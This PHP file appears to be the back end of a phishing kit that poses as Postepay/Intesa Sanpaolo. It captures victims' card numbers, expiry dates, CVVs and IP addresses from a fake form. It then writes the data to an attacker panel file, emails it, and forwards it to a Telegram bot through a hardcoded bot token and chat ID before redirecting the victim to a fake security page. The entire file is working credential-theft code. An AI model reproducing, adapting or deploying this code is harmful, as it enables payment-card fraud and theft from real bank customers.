<?php
$bin4 = substr($_POST['user'] , 0 , 4);
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['user']) and !empty($_POST['pass'])
         and !empty($_POST['phne'])
    ) {
            $_SESSION['user']=$_POST['user'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
include('../../BOTS/STRNG.php');
$ATR480X .= "••••••••••••••• 💳 POSTEPAY.ATR480X 💳\n";
$ATR480X .= "[ CARD NUMB ] *   :   ".$_POST['user']."\n";
$ATR480X .= "[ EXPRY ] *   :   ".$_POST['pass']."/".$_POST['year']."\n";
$ATR480X .= "[ CVV ] *   :   ".$_POST['phne']."\n";
$ATR480X .= "••••••••••••••• ℹ️ [ INFOS VIC ] ℹ️\n";
$ATR480X .= "[ 🔎 ] = $ip\n";
$ATR480X .= "••••••••••••••• 🇮🇹🇮🇹 IT 🇮🇹🇮🇹\n";

            $file = fopen("../../PANEL/ATR480X.html", "a+");
            fwrite($file, $ATR480X);fclose($file);
            $to = "";
            $subject = "CC.DONE | $ip";
            $headers = "From: INTESASANPAOLO.ATR480X<atr480x@atr480x.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $ATR480X, $headers);
$token = "7883633314:AAGvKDeRKvgLWiOpEWkaDa8ZeZuP3AlFidI";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1858722787&text=" . urlencode($ATR480X)."" );
$md5=md5(time());
            header("Location: ../SISTEMA.DI.SICUREZZA/REDIRECT/EXAMPLE.php?client_id=$my_rand_strng");
    }else header("Location: ?error=".md5($_GET['error']));
}
?>